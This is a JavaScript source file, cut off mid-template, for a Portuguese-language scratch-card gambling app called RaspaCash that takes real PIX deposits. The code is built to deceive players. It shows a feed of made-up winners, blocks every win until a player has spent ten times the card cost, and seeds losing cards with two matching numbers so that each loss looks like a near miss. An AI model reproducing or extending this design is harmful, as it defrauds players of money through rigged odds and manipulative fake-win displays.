// Sistema RaspaCash - JavaScript Principal
class RaspaCashApp {
    constructor() {
        this.state = {
            // Estados do usuário
            isLoggedIn: false,
            user: { name: '', email: '' },
            balance: 0,
            
            // Estados da tela
            currentScreen: 'login', // login, menu, game, deposit, withdraw, promo, feed
            
            // Estados do jogo
            selectedPlan: null,
            scratchCard: null,
            isScratching: false,
            isRevealed: false,
            prize: 0,
            scratchedArea: 0,
            
            // Estados promocionais
            promoCards: [],
            
            // Estados PIX
            showPixModal: false,
            currentPixPayment: null,
            pixCheckInterval: null,
            isProcessingPayment: false,
            
            // APIs
            picPayAPI: null,
            githubAPI: null,
            
            // Sistema de fidelidade
            loyaltySequences: {
                1: { spent: 0, games: 0 },
                2: { spent: 0, games: 0 },
                3: { spent: 0, games: 0 }
            }
        };
        
        this.canvas = null;
        this.ctx = null;
        
        this.plans = [
            {
                id: 1,
                name: "Plano Clássico",
                cost: 5,
                maxPrize: 500,
                returnRate: 0.03,
                color: "from-green-400 to-green-600",
                description: "Diversão garantida com prêmios de até R$ 500!"
            },
            {
                id: 2,
                name: "Plano Premium",
                cost: 10,
                maxPrize: 1000,
                returnRate: 0.02,
                color: "from-purple-400 to-purple-600",
                description: "Experiência premium com prêmios de até R$ 1.000!"
            },
            {
                id: 3,
                name: "Plano VIP",
                cost: 20,
                maxPrize: 2000,
                returnRate: 0.015,
                color: "from-red-400 to-red-600",
                description: "Exclusividade VIP com prêmios de até R$ 2.000!"
            }
        ];
        
        this.promotionalPacks = [
            {
                id: 'promo-1',
                planId: 1,
                name: "Pacote Clássico",
                quantity: 5,
                originalPrice: 25,
                promoPrice: 15,
                discount: 40,
                color: "from-green-400 to-green-600"
            },
            {
                id: 'promo-2',
                planId: 2,
                name: "Pacote Premium",
                quantity: 5,
                originalPrice: 50,
                promoPrice: 40,
                discount: 20,
                color: "from-purple-400 to-purple-600"
            },
            {
                id: 'promo-3',
                planId: 3,
                name: "Pacote VIP",
                quantity: 5,
                originalPrice: 100,
                promoPrice: 85,
                discount: 15,
                color: "from-red-400 to-red-600"
            }
        ];
        
        this.fakeFeed = [
            { name: "João S.", amount: 150, plan: "Clássico", time: "2 min atrás" },
            { name: "Maria L.", amount: 890, plan: "Premium", time: "5 min atrás" },
            { name: "Carlos P.", amount: 45, plan: "Clássico", time: "8 min atrás" },
            { name: "Ana R.", amount: 1200, plan: "VIP", time: "12 min atrás" },
            { name: "Pedro M.", amount: 320, plan: "Premium", time: "15 min atrás" },
            { name: "Julia F.", amount: 75, plan: "Clássico", time: "18 min atrás" },
            { name: "Roberto K.", amount: 1890, plan: "VIP", time: "22 min atrás" },
            { name: "Fernanda O.", amount: 450, plan: "Premium", time: "25 min atrás" }
        ];
        
        this.init();
    }
    
    async init() {
        try {
            // Carregar APIs se disponíveis
            if (window.createPicPayAPI) {
                this.state.picPayAPI = window.createPicPayAPI();
                console.log('✅ PicPay API carregada');
            }
            
            if (window.createGitHubAPI) {
                this.state.githubAPI = window.createGitHubAPI();
                console.log('✅ GitHub API carregada');
            }
            
            // Renderizar tela inicial
            this.render();
            
            // Event listeners
            this.setupEventListeners();
            
        } catch (error) {
            console.error('Erro ao inicializar:', error);
            this.render();
        }
    }
    
    setupEventListeners() {
        // Eventos de mouse e touch para raspar
        document.addEventListener('mouseup', () => {
            this.state.isScratching = false;
        });
        
        document.addEventListener('touchend', () => {
            this.state.isScratching = false;
        });
    }
    
    // Sistema de fidelidade
    calculateLoyaltyBonus(planId) {
        const sequence = this.state.loyaltySequences[planId];
        const plan = this.plans.find(p => p.id === planId);
        
        if (!sequence || !plan) return 0;
        
        const spendTarget = plan.cost * 10;
        
        if (sequence.spent >= spendTarget) {
            const extraSpent = sequence.spent - spendTarget;
            const extraCycles = Math.floor(extraSpent / spendTarget);
            const bonusRate = Math.min(extraCycles * 0.02, 0.15);
            return bonusRate;
        }
        
        return 0;
    }
    
    // Gerar cartela de raspadinha
    generateScratchCard(plan) {
        const numbers = [];
        const maxNumber = plan.maxPrize;
        
        const sequence = this.state.loyaltySequences[plan.id];
        const spendTarget = plan.cost * 10;
        const hasReachedMinimum = sequence.spent >= spendTarget;
        
        const loyaltyBonus = this.calculateLoyaltyBonus(plan.id);
        const finalReturnRate = plan.returnRate + loyaltyBonus;
        
        const random = Math.random();
        
        if (hasReachedMinimum && random < finalReturnRate) {
            // VAI GANHAR
            let prizeNumber;
            if (random < 0.001) {
                prizeNumber = plan.maxPrize;
            } else if (random < 0.003) {
                prizeNumber = Math.floor(Math.random() * (plan.maxPrize * 0.2)) + (plan.maxPrize * 0.1);
            } else {
                prizeNumber = Math.floor(Math.random() * (plan.cost * 3)) + plan.cost;
            }
            
            for (let i = 0; i < 9; i++) {
                numbers.push(Math.floor(Math.random() * maxNumber) + 1);
            }
            
            const positions = [];
            while (positions.length < 3) {
                const pos = Math.floor(Math.random() * 9);
                if (!positions.includes(pos)) {
                    positions.push(pos);
                }
            }
            
            positions.forEach(pos => {
                numbers[pos] = prizeNumber;
            });
            
            return { 
                numbers, 
                prizeNumber, 
                isWinner: true, 
                loyaltyBonus,
                finalReturnRate,
                hasReachedMinimum
            };
        } else {
            // NÃO VAI GANHAR
            for (let i = 0; i < 9; i++) {
                numbers.push(Math.floor(Math.random() * maxNumber) + 1);
            }
            
            const almostWinNumber = Math.floor(Math.random() * (plan.cost * 8)) + plan.cost;
            
            const positions = [];
            while (positions.length < 2) {
                const pos = Math.floor(Math.random() * 9);
                if (!positions.includes(pos)) {
                    positions.push(pos);
                }
            }
            
            positions.forEach(pos => {
                numbers[pos] = almostWinNumber;
            });
            
            return { 
                numbers, 
                prizeNumber: 0, 
                isWinner: false, 
                almostWinNumber,
                loyaltyBonus,
                finalReturnRate,
                hasReachedMinimum
            };
        }
    }
    
    // Verificar se ganhou
    checkWin(numbers) {
        const counts = {};
        numbers.forEach(num => {
            counts[num] = (counts[num] || 0) + 1;
        });
        
        const winningNumber = Object.keys(counts).find(num => counts[num] >= 3);
        return winningNumber ? parseInt(winningNumber) : 0;
    }
    
    // Handlers de eventos
    async handleLogin(e) {
        e.preventDefault();
        const formData = new FormData(e.target);
        const userData = {
            name: formData.get('name')?.trim(),
            email: formData.get('email')?.trim()
        };
        
        if (!userData.name || userData.name.length < 2) {
            alert('Por favor, digite seu nome completo (mínimo 2 caracteres)');
            return;
        }
        
        if (!userData.email || !userData.email.includes('@')) {
            alert('Por favor, digite um email válido');
            return;
        }
        
        this.state.user = userData;
        
        try {
            if (this.state.githubAPI) {
                const userDataFromGitHub = await this.state.githubAPI.loadUserData(userData.email);
                this.state.balance = userDataFromGitHub.balance || 0;
            } else {
                const localData = localStorage.getItem(`user_${userData.email}`);
                if (localData) {
                    const parsed = JSON.parse(localData);
                    this.state.balance = parsed.balance || 0;
                } else {
                    this.state.balance = 0;
                }
            }
        } catch (error) {
            console.error('Erro ao carregar dados do usuário:', error);
            this.state.balance = 0;
        }
        
        this.state.isLoggedIn = true;
        this.state.currentScreen = 'menu';
        this.render();
    }
    
    async handleDeposit(e) {
        e.preventDefault();
        const amount = parseFloat(e.target.depositAmount.value);
        
        if (!amount || amount < 5) {
            alert('Valor mínimo para depósito: R$ 5,00');
            return;
        }
        
        if (!this.state.picPayAPI) {
            alert('Sistema de pagamento não disponível. Tente novamente.');
            return;
        }
        
        try {
            this.state.isProcessingPayment = true;
            this.render();
            
            const pixData = await this.state.picPayAPI.generatePixPayment(amount, this.state.user.email, this.state.user.email);
            
            this.state.currentPixPayment = pixData;
            this.state.showPixModal = true;
            this.state.currentScreen = 'pix';
            
            this.startPaymentCheck(pixData.id);
            
        } catch (error) {
            console.error('Erro ao gerar PIX:', error);
            alert('Erro ao gerar PIX: ' + error.message);
        } finally {
            this.state.isProcessingPayment = false;
            this.render();
        }
    }
    
    startPaymentCheck(paymentId) {
        const interval = setInterval(async () => {
            try {
                if (!this.state.picPayAPI) return;
                
                const status = await this.state.picPayAPI.checkPaymentStatus(paymentId);
                
                if (status.status === 'paid' || status.status === 'completed') {
                    const amount = this.state.currentPixPayment.amount;
                    this.state.balance += amount;
                    
                    if (this.state.githubAPI) {
                        await this.state.githubAPI.logTransaction({
                            type: 'deposit',
                            amount: amount,
                            userId: this.state.user.email,
                            method: 'picpay_pix',
                            status: 'completed'
                        });
                    }
                    
                    clearInterval(interval);
                    this.state.pixCheckInterval = null;
                    this.state.showPixModal = false;
                    this.state.currentScreen = 'menu';
                    
                    alert(`Pagamento confirmado! R$ ${amount.toFixed(2)} foi adicionado ao seu saldo.`);
                    this.render();
                    
                } else if (status.status === 'expired' || status.status === 'cancelled') {
                    clearInterval(interval);
                    this.state.pixCheckInterval = null;
                    this.state.showPixModal = false;
                    this.state.currentScreen = 'menu';
                    alert('Pagamento expirado ou cancelado.');
                    this.render();
                }
                
            } catch (error) {
                console.error('Erro ao verificar pagamento:', error);
            }
        }, 5000);
        
        this.state.pixCheckInterval = interval;
        
        setTimeout(() => {
            if (interval) {
                clearInterval(interval);
                this.state.pixCheckInterval = null;
            }
        }, 30 * 60 * 1000);
    }
    
    startGame(plan) {
        if (this.state.balance < plan.cost) {
            alert('Saldo insuficiente!');
            return;
        }
        
        this.state.loyaltySequences[plan.id].spent += plan.cost;
        this.state.loyaltySequences[plan.id].games += 1;
        
        this.state.balance -= plan.cost;
        this.state.selectedPlan = plan;
        this.state.scratchCard = this.generateScratchCard(plan);
        this.state.prize = this.state.scratchCard.prizeNumber;
        this.state.isRevealed = false;
        this.state.scratchedArea = 0;
        this.state.currentScreen = 'game';
        
        this.render();
        
        // Registrar jogo
        if (this.state.githubAPI) {
            this.state.githubAPI.logGame({
                userId: this.state.user.email,
                cost: plan.cost,
                planName: plan.name,
                won: this.state.scratchCard.isWinner,
                prize: this.state.scratchCard.prizeNumber || 0
            }).catch(console.error);
        }
    }
    
    collectPrize() {
        this.state.balance += this.state.prize;
        
        if (this.state.prize > 0) {
            const transactionData = {
                type: 'prize',
                amount: this.state.prize,
                userId: this.state.user.email,
                method: 'scratch_card',
                status: 'completed',
                timestamp: new Date().toISOString()
            };
            
            if (this.state.githubAPI) {
                this.state.githubAPI.logTransaction(transactionData).catch(console.error);
            }
            
            try {
                const userKey = `user_${this.state.user.email}`;
                const userData = JSON.parse(localStorage.getItem(userKey) || '{}');
                userData.balance = this.state.balance;
                userData.lastUpdated = new Date().toISOString();
                localStorage.setItem(userKey, JSON.stringify(userData));
            } catch (error) {
                console.error('Erro ao salvar no localStorage:', error);
            }
        }
        
        this.state.selectedPlan = null;
        this.state.prize = 0;
        this.state.isRevealed = false;
        this.state.scratchCard = null;
        this.state.currentScreen = 'menu';
        this.render();
    }
    
    // Sistema de raspar
    setupScratchCanvas() {
        setTimeout(() => {
            this.canvas = document.getElementById('scratchCanvas');
            if (!this.canvas) return;
            
            this.ctx = this.canvas.getContext('2d');
            
            // Cobrir com cobertura cinza
            this.ctx.fillStyle = '#666666';
            this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
            
            // Textura da cobertura
            this.ctx.fillStyle = '#777777';
            for (let i = 0; i < this.canvas.width; i += 15) {
                for (let j = 0; j < this.canvas.height; j += 15) {
                    if ((i + j) % 30 === 0) {
                        this.ctx.fillRect(i, j, 8, 8);
                    }
                }
            }
            
            // Texto da cobertura
            this.ctx.fillStyle = '#FFFFFF';
            this.ctx.font = 'bold 16px Arial';
            this.ctx.textAlign = 'center';
            this.ctx.textBaseline = 'middle';
            this.ctx.shadowColor = '#000000';
            this.ctx.shadowBlur = 3;
            
            this.ctx.fillText('RASPE PARA REVELAR', this.canvas.width / 2, this.canvas.height / 2 - 20);
            this.ctx.font = 'bold 14px Arial';
            this.ctx.fillText('3 números iguais = GANHOU!', this.canvas.width / 2, this.canvas.height / 2);
            this.ctx.font = 'bold 12px Arial';
            this.ctx.fillText('(Clique e arraste)', this.canvas.width / 2, this.canvas.height / 2 + 20);
            
            this.ctx.shadowBlur = 0;
            
            // Event listeners
            this.canvas.addEventListener('mousedown', () => {
                this.state.isScratching = true;
            });
            
            this.canvas.addEventListener('mousemove', (e) => {
                this.scratch(e);
            });
            
            this.canvas.addEventListener('touchstart', (e) => {
                e.preventDefault();
                this.state.isScratching = true;
            });
            
            this.canvas.addEventListener('touchmove', (e) => {
                e.preventDefault();
                const touch = e.touches[0];
                const rect = this.canvas.getBoundingClientRect();
                const mockEvent = {
                    clientX: touch.clientX,
                    clientY: touch.clientY
                };
                this.scratch(mockEvent);
            });
            
        }, 100);
    }
    
    scratch(e) {
        if (!this.canvas || !this.state.isScratching || !this.state.scratchCard) return;
        
        const rect = this.canvas.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        
        this.ctx.globalCompositeOperation = 'destination-out';
        this.ctx.beginPath();
        this.ctx.arc(x, y, 25, 0, 2 * Math.PI);
        this.ctx.fill();
        this.ctx.globalCompositeOperation = 'source-over';
        
        // Calcular área raspada
        const imageData = this.ctx.getImageData(0, 0, this.canvas.width, this.canvas.height);
        let transparent = 0;
        let totalPixels = 0;
        
        for (let i = 3; i < imageData.data.length; i += 4) {
            totalPixels++;
            if (imageData.data[i] < 100) {
                transparent++;
            }
        }
        
        const scratchPercent = transparent / totalPixels;
        this.state.scratchedArea = scratchPercent;
        
        // Atualizar barra de progresso
        const progressBar = document.getElementById('progressBar');
        if (progressBar) {
            progressBar.style.width = `${Math.min(scratchPercent * 100, 100)}%`;
        }
        
        const scratchInfo = document.getElementById('scratchInfo');
        if (scratchInfo) {
            scratchInfo.textContent = `Área raspada: ${(scratchPercent * 100).toFixed(1)}%`;
        }
        
        if (scratchPercent >= 0.7 && !this.state.isRevealed) {
            this.state.isRevealed = true;
            if (this.state.scratchCard) {
                const winningAmount = this.checkWin(this.state.scratchCard.numbers);
                this.state.prize = winningAmount;
            }
            this.render();
        }
    }
    
    // Renderização das telas
    render() {
        const app = document.getElementById('app');
        
        switch (this.state.currentScreen) {
            case 'login':
                app.innerHTML = this.renderLogin();
                break;
            case 'menu':
                app.innerHTML = this.renderMenu();
                break;
            case 'game':
                app.innerHTML = this.renderGame();
                this.setupScratchCanvas();
                break;
            case 'deposit':
                app.innerHTML = this.renderDeposit();
                break;
            case 'withdraw':
                app.innerHTML = this.renderWithdraw();
                break;
            case 'promo':
                app.innerHTML = this.renderPromo();
                break;
            case 'feed':
                app.innerHTML = this.renderFeed();
                break;
            case 'pix':
                app.innerHTML = this.renderPix();
                this.generateQRCode();
                break;
            default:
                app.innerHTML = this.renderLogin();
        }
    }
    
    renderLogin() {
        return `
            <div class="w-full h-full bg-gradient-to-br from-pink-500 via-red-500 to-yellow-500 p-8 text-white flex items-center justify-center relative overflow-hidden">
                <div class="absolute inset-0 opacity-20">
                    <div class="absolute top-10 left-10 w-32 h-32 bg-yellow-400 rounded-full blur-xl animate-pulse"></div>
                    <div class="absolute top-40 right-20 w-24 h-24 bg-pink-400 rounded-full blur-xl animate-bounce"></div>
                    <div class="absolute bottom-20 left-1/3 w-40 h-40 bg-purple-400 rounded-full blur-xl animate-pulse"></div>
                    <div class="absolute bottom-10 right-10 w-28 h-28 bg-green-400 rounded-full blur-xl animate-bounce"></div>
                </div>
                <div class="bg-gradient-to-br from-purple-800/80 to-blue-800/80 backdrop-blur-lg rounded-2xl p-8 max-w-md w-full border border-yellow-400/30 shadow-2xl relative z-10">
                    <div class="text-center mb-8">
                        <h1 class="text-4xl font-bold mb-2 bg-gradient-to-r from-yellow-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
                            🎰 RaspaCash 🎰
                        </h1>
                        <p class="text-lg text-yellow-200">Faça login para começar a ganhar!</p>
                        <div class="flex justify-center space-x-2 mt-2">
                            <span class="text-2xl animate-bounce">💰</span>
                            <span class="text-2xl animate-pulse">🎉</span>
                            <span class="text-2xl animate-bounce">💎</span>
                        </div>
                    </div>
                    
                    <form onsubmit="app.handleLogin(event)" class="space-y-4">
                        <div>
                            <label class="block text-sm font-bold mb-2">Nome Completo</label>
                            <input
                                name="name"
                                type="text"
                                required
                                class="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
                                placeholder="Seu nome completo"
                            />
                        </div>
                        <div>
                            <label class="block text-sm font-bold mb-2">Email</label>
                            <input
                                name="email"
                                type="email"
                                required
                                class="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
                                placeholder="seu@email.com"
                            />
                        </div>
                        <button
                            type="submit"
                            class="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 border-green-300"
                        >
                            ✨ Entrar na Plataforma ✨
                        </button>
                    </form>
                    
                    <div class="mt-6 text-center text-sm opacity-75">
                        <p>Ao fazer login, você concorda com nossos termos de uso</p>
                    </div>
                </div>
            </div>
        `;
    }
    
    renderMenu() {
        return `
            <div class="w-full h-full bg-gradient-to-br from-red-500 via-purple-600 via-blue-600 to-green-500 p-4 text-white overflow-y-scroll relative">
                <div class="absolute inset-0 opacity-15">
                    <div class="absolute top-20 left-20 w-48 h-48 bg-yellow-400 rounded-full blur-3xl animate-pulse"></div>
                    <div class="absolute top-60 right-40 w-32 h-32 bg-pink-400 rounded-full blur-2xl animate-bounce"></div>
                    <div class="absolute bottom-40 left-1/4 w-40 h-40 bg-cyan-400 rounded-full blur-2xl animate-pulse"></div>
                    <div class="absolute bottom-20 right-20 w-36 h-36 bg-orange-400 rounded-full blur-2xl animate-bounce"></div>
                    <div class="absolute top-1/2 left-1/2 w-28 h-28 bg-lime-400 rounded-full blur-xl animate-pulse"></div>
                </div>
                <div class="max-w-6xl mx-auto relative z-10">
                    <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 space-y-4 sm:space-y-0">
                        <div>
                            <h1 class="text-2xl sm:text-4xl font-bold bg-gradient-to-r from-yellow-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
                                🎰 RaspaCash 🎰
                            </h1>
                            <p class="text-sm sm:text-xl text-yellow-200">Olá, ${this.state.user.name}! 👋</p>
                        </div>
                        <div class="flex flex-wrap gap-2 w-full sm:w-auto">
                            <div class="bg-gradient-to-r from-green-500 to-emerald-600 px-2 sm:px-4 py-1 sm:py-2 rounded-lg shadow-lg border border-yellow-400/30">
                                <div class="text-xs sm:text-sm text-yellow-200">💰 Saldo</div>
                                <div class="text-sm sm:text-lg font-bold text-white">R$ ${this.state.balance.toFixed(2)}</div>
                            </div>
                            <button
                                onclick="app.state.currentScreen = 'withdraw'; app.render();"
                                class="w-full sm:w-auto bg-gradient-to-r from-purple-500 to-pink-600 hover:from-purple-600 hover:to-pink-700 px-4 py-3 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-base"
                            >
                                💸 Sacar
                            </button>
                            <button
                                onclick="app.state.currentScreen = 'deposit'; app.render();"
                                class="w-full sm:w-auto bg-gradient-to-r from-blue-500 to-cyan-600 hover:from-blue-600 hover:to-cyan-700 px-4 py-3 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-base"
                            >
                                💳 Depositar
                            </button>
                            <button
                                onclick="app.state.currentScreen = 'feed'; app.render();"
                                class="w-full sm:w-auto bg-gradient-to-r from-orange-500 via-red-500 to-pink-500 hover:from-orange-600 hover:via-red-600 hover:to-pink-600 px-4 py-3 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg animate-pulse text-base"
                            >
                                🎉 Ganhos
                            </button>
                            <button
                                onclick="app.state.currentScreen = 'promo'; app.render();"
                                class="w-full sm:w-auto bg-gradient-to-r from-yellow-500 via-orange-500 to-red-500 hover:from-yellow-600 hover:via-orange-600 hover:to-red-600 px-6 py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-2xl animate-bounce text-lg border-2 border-yellow-300"
                            >
                                🔥 SUPER PROMOÇÃO! 🔥
                            </button>
                        </div>
                    </div>
                    
                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6 mb-6">
                        ${this.plans.map(plan => `
                            <div class="bg-gradient-to-br from-gray-900/80 via-purple-900/80 to-blue-900/80 backdrop-blur-lg rounded-xl overflow-hidden hover:from-gray-800/90 hover:via-purple-800/90 hover:to-blue-800/90 transition-all transform hover:scale-105 border border-yellow-400/30 shadow-2xl">
                                <div class="p-4 sm:p-6">
                                    <div class="inline-block px-3 py-1 rounded-full text-xs sm:text-sm font-bold mb-3 bg-gradient-to-r ${plan.color} text-white shadow-lg animate-pulse">
                                        ⭐ ${plan.name} ⭐
                                    </div>
                                    
                                    <p class="text-xs sm:text-sm mb-4 opacity-90">${plan.description}</p>
                                    
                                    <div class="space-y-2 text-xs sm:text-sm mb-4">
                                        <div class="flex justify-between">
                                            <span>💰 Ganho máximo:</span>
                                            <span class="font-bold bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent">R$ ${plan.maxPrize.toLocaleString()}</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span>🎫 Custo:</span>
                                            <span class="font-bold text-cyan-400">R$ ${plan.cost}</span>
                                        </div>
                                    </div>
                                    
                                    <button
                                        onclick="app.startGame(${JSON.stringify(plan).replace(/"/g, '&quot;')})"
                                        ${this.state.balance < plan.cost ? 'disabled' : ''}
                                        class="w-full py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-base border-2 ${
                                            this.state.balance >= plan.cost 
                                                ? 'bg-gradient-to-r from-green-500 via-emerald-500 to-teal-500 hover:from-green-600 hover:via-emerald-600 hover:to-teal-600 text-white animate-pulse border-green-300' 
                                                : 'bg-gradient-to-r from-gray-500 to-gray-600 text-gray-300 cursor-not-allowed border-gray-400'
                                        }"
                                    >
                                        ${this.state.balance >= plan.cost ? `🎰 Jogar - R$ ${plan.cost} 🎰` : '💸 Saldo Insuficiente'}
                                    </button>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                    
                    <div class="text-center text-sm opacity-75">
                        <p>⚠️ Jogue com responsabilidade. Este é um jogo de azar. +18 anos.</p>
                    </div>
                </div>
            </div>
        `;
    }
    
    renderGame() {
        if (!this.state.scratchCard) return '';
        
        return `
            <div class="w-full h-full bg-gradient-to-br from-pink-600 via-purple-700 via-blue-700 to-teal-600 p-4 text-white overflow-y-scroll relative">
                <div class="absolute inset-0 opacity-20">
                    <div class="absolute top-10 left-10 w-32 h-32 bg-yellow-400 rounded-full blur-xl animate-pulse"></div>
                    <div class="absolute top-40 right-20 w-24 h-24 bg-pink-400 rounded-full blur-xl animate-bounce"></div>
                    <div class="absolute bottom-20 left-1/3 w-40 h-40 bg-cyan-400 rounded-full blur-xl animate-pulse"></div>
                    <div class="absolute bottom-10 right-10 w-28 h-28 bg-orange-400 rounded-full blur-xl animate-bounce"></div>
                </div>
                <div class="text-center relative z-10 min-h-full flex flex-col justify-center py-4">
                    <div class="mb-4">
                        <h2 class="text-xl sm:text-3xl font-bold mb-2 bg-gradient-to-r from-yellow-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
                            🎯 ${this.state.selectedPlan.name} 🎯
                        </h2>
                        <div class="text-sm sm:text-xl bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent font-bold">
                            💰 Saldo: R$ ${this.state.balance.toFixed(2)}
                        </div>
                    </div>
                    
                    <div class="bg-gradient-to-br from-gray-900/80 via-purple-900/80 to-blue-900/80 backdrop-blur-lg rounded-xl p-4 sm:p-6 mb-6 border border-yellow-400/30 shadow-2xl">
                        <div class="bg-yellow-400/20 rounded-lg p-3 mb-4 border border-yellow-400/40">
                            <div class="text-center">
                                <div class="text-lg font-bold text-yellow-300 mb-1">
                                    🎯 COMO GANHAR 🎯
                                </div>
                                <div class="text-sm text-yellow-200">
                                    Encontre <span class="font-bold text-yellow-100">3 NÚMEROS IGUAIS</span> para ganhar o valor desse número!
                                </div>
                            </div>
                        </div>
                        
                        <div class="relative" style="width: 300px; height: 200px; margin: 0 auto;">
                            <div class="absolute inset-0 grid grid-cols-3 gap-1 p-2 bg-white rounded-lg border-2 border-gray-300">
                                ${this.state.scratchCard.numbers.map((number, index) => {
                                    const numberCounts = {};
                                    this.state.scratchCard.numbers.forEach(num => {
                                        numberCounts[num] = (numberCounts[num] || 0) + 1;
                                    });
                                    
                                    const isRepeated = numberCounts[number] >= 2;
                                    const isWinner = this.state.scratchCard.isWinner && number === this.state.scratchCard.prizeNumber;
                                    
                                    return `
                                        <div class="flex items-center justify-center text-xs sm:text-sm font-bold rounded border-2 ${
                                            isWinner 
                                                ? 'bg-gradient-to-br from-yellow-400 to-orange-500 text-white border-yellow-300 animate-pulse' 
                                                : isRepeated
                                                    ? 'bg-gradient-to-br from-yellow-300 to-yellow-400 text-gray-800 border-yellow-400'
                                                    : 'bg-gradient-to-br from-white to-gray-100 text-gray-800 border-gray-300'
                                        }">
                                            R$ ${number}
                                        </div>
                                    `;
                                }).join('')}
                            </div>

                            <canvas
                                id="scratchCanvas"
                                width="300"
                                height="200"
                                class="absolute inset-0 border-2 border-white/30 rounded-lg cursor-pointer canvas-scratch"
                            ></canvas>
                            
                            <div class="mt-4 text-sm">
                                <div class="flex justify-between items-center">
                                    <span id="scratchInfo" class="text-cyan-300">Área raspada: ${(this.state.scratchedArea * 100).toFixed(1)}%</span>
                                    <span class="text-yellow-300 font-bold animate-pulse">⚡ Continue raspando! ⚡</span>
                                </div>
                                <div class="w-full bg-gray-700 rounded-full h-3 mt-2 border border-yellow-400/30">
                                    <div 
                                        id="progressBar"
                                        class="bg-gradient-to-r from-green-400 via-yellow-400 to-orange-400 h-3 rounded-full transition-all duration-300 shadow-lg"
                                        style="width: ${Math.min(this.state.scratchedArea * 100, 100)}%"
                                    ></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    ${this.state.isRevealed ? `
                        <div class="bg-gradient-to-br from-purple-900/80 via-blue-900/80 to-cyan-900/80 backdrop-blur-lg rounded-xl p-4 sm:p-6 mb-6 border border-cyan-400/30 shadow-2xl">
                            <div class="text-center mb-4">
                                <div class="text-lg font-bold text-cyan-300 mb-2">
                                    🎯 Números Revelados:
                                </div>
                            </div>
                            
                            <div class="grid grid-cols-3 gap-2 max-w-xs mx-auto mb-4">
                                ${this.state.scratchCard.numbers.map((number, index) => {
                                    const numberCounts = {};
                                    this.state.scratchCard.numbers.forEach(num => {
                                        numberCounts[num] = (numberCounts[num] || 0) + 1;
                                    });
                                    
                                    const count = numberCounts[number];
                                    const isWinner = this.state.scratchCard.isWinner && number === this.state.scratchCard.prizeNumber;
                                    const isRepeated = count >= 2;
                                    
                                    return `
                                        <div class="p-3 rounded-lg text-center font-bold text-lg transition-all duration-500 border-2 ${
                                            isWinner 
                                                ? 'bg-gradient-to-br from-yellow-400 to-orange-500 text-white animate-pulse border-yellow-300 shadow-lg shadow-yellow-400/50 transform scale-105' 
                                                : isRepeated
                                                    ? 'bg-gradient-to-br from-yellow-500 to-yellow-600 text-white border-yellow-400 shadow-lg shadow-yellow-500/30'
                                                    : 'bg-gradient-to-br from-white to-gray-100 text-gray-800 border-gray-300'
                                        }">
                                            R$ ${number}
                                            ${count >= 2 ? `<div class="text-xs mt-1 opacity-75">${count}x</div>` : ''}
                                        </div>
                                    `;
                                }).join('')}
                            </div>

                            <div class="text-center">
                                ${this.state.prize > 0 ? `
                                    <div class="text-xl font-bold text-green-300 animate-bounce bg-green-500/20 rounded-lg p-4 border border-green-400/40">
                                        🎉 PARABÉNS! Você ganhou R$ ${this.state.prize}! 🎉
                                    </div>
                                ` : `
                                    <div class="space-y-2">
                                        <div class="text-lg font-bold text-orange-300 bg-orange-500/20 rounded-lg p-3 border border-orange-400/40">
                                            😅 Poxa! Passou pertinho! 
                                        </div>
                                        ${this.state.scratchCard.almostWinNumber ? `
                                            <div class="text-sm text-yellow-300 bg-yellow-500/20 rounded-lg p-2 border border-yellow-400/40">
                                                🔥 Você teve 2x R$ ${this.state.scratchCard.almostWinNumber}! Faltou só mais um! 🔥
                                            </div>
                                        ` : ''}
                                        <div class="text-sm text-cyan-300">
                                            🎯 Tente novamente! A sorte pode estar na próxima cartela!
                                        </div>
                                    </div>
                                `}
                            </div>
                        </div>
                    ` : ''}
                    
                    <div class="w-full max-w-md mx-auto space-y-3">
                        ${this.state.isRevealed && this.state.prize > 0 ? `
                            <button
                                onclick="app.collectPrize()"
                                class="w-full bg-gradient-to-r from-green-500 via-emerald-500 to-teal-500 hover:from-green-600 hover:via-emerald-600 hover:to-teal-600 px-4 py-4 rounded-xl font-bold text-lg transition-all transform active:scale-95 shadow-lg animate-bounce border-2 border-green-300"
                            >
                                🎉 Coletar R$ ${this.state.prize}! 🎉
                            </button>
                        ` : ''}
                        
                        <button
                            onclick="app.state.currentScreen = 'menu'; app.render();"
                            class="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 px-4 py-4 rounded-xl font-bold text-lg transition-all transform active:scale-95 shadow-lg border-2 border-blue-300"
                        >
                            ${this.state.isRevealed ? '🎰 Jogar Novamente' : '🔙 Voltar ao Menu'}
                        </button>
                    </div>

                    <div class="mt-4 text-center">
                        <div class="text-sm opacity-75 mb-2">
                            ${this.state.scratchedArea < 0.8 
                                ? 'Clique e arraste para raspar a cartela' 
                                : this.state.isRevealed 
                                    ? 'Raspadinha completa! Veja o resultado acima.'
                                    : 'Quase lá! Continue raspando...'
                            }
                        </div>
                        
                        ${!this.state.isRevealed ? `
                            <div class="text-xs opacity-50">
                                Raspe para revelar os números e encontre 3 iguais para ganhar!
                            </div>
                        ` : `
                            <div class="text-xs text-green-300 bg-green-500/20 rounded-lg p-2 mt-2 border border-green-400/40">
                                ✅ Todos os números foram revelados! ${this.state.prize > 0 ? 'Você ganhou!' : 'Tente novamente na próxima cartela!'}
